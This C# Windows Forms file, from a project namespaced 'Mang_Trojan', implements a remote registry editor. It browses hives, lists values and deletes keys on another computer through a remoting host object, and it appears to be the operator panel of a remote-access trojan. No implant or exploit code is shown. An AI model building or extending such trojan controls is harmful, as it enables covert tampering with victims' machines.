using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Mang_Trojan.form
{
    public partial class RegistryEditor : Form
    {
        RemoteObject.ScreenObject hostInstance;
        string path;
        string registry;
        private ListViewHitTestInfo selected;

        public RegistryEditor(RemoteObject.ScreenObject hostInstance)
        {
            InitializeComponent();
            this.hostInstance = hostInstance;
            this.Text = "Sửa registry"+hostInstance.GetComputerName();
            this.treeView1.ImageList = new ImageList();
            Bitmap folder = Resource1.am_folder;
            this.treeView1.ImageList.Images.Add(folder);

        }

        private void RegistryEditor_Load(object sender, EventArgs e)
        {
            treeView1.Nodes.Add("HKEY_CLASSES_ROOT");
            treeView1.Nodes.Add("HKEY_CURRENT_USER");
            treeView1.Nodes.Add("HKEY_LOCAL_MACHINE");
            treeView1.Nodes.Add("HKEY_USERS");
            treeView1.Nodes.Add("HKEY_CURRENT_CONFIG");
        }

        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            string _path = string.Empty;
            if (e.Node.Level == 0)
            {
                registry = e.Node.Text;
            }
            else
            {
                _path = e.Node.Text;
                TreeNode temp = e.Node.Parent;
                while (true)
                {
                    if (temp.Level != 0)
                    {
                        _path = temp.Text + "\\" + _path;
                        temp = temp.Parent;
                    }
                    else
                    {
                        break;
                    }
                }
            }
            path = _path;
            string subKeys=hostInstance.GetSubKeys(_path, registry);
             string[] dirs = subKeys.Split(new string[] { Environment.NewLine }, StringSplitOptions.None);
            
            if (e.Node.Nodes.Count != 0)
            {
                e.Node.Nodes.Clear();
            }

            foreach (string dir in dirs)
            {
                if (dir != string.Empty)
                {
                   e.Node.Nodes.Add(dir);
                }
            }
            if (e.Node.Nodes.Count != 0)
            {
                e.Node.Expand();
            }
            listView1.Items.Clear();
            GetValues(_path);
        }

        private void GetValues(string key)
        {
           string allValues=hostInstance.GetValues(key, registry);
            string[] files = allValues.Split(new string[] {Environment.NewLine }, StringSplitOptions.None);
            foreach (string file in files)
            {
                if (file != string.Empty)
                {
                   
                    string[] temp = file.Split(new string[] { "|*|" }, StringSplitOptions.None);
                    ListViewItem item = new ListViewItem(temp[0]);
                    item.SubItems.Add(temp[1]);
                    listView1.Items.Add(item);
                }
            }

        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            hostInstance.DeleteKey(path + @"\" + selected.Item.Text,registry);
        }

        private void listView1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                selected = listView1.HitTest(e.X, e.Y);
                contextMenuStrip1.Show(listView1, e.Location);
            }
        }
    }
}
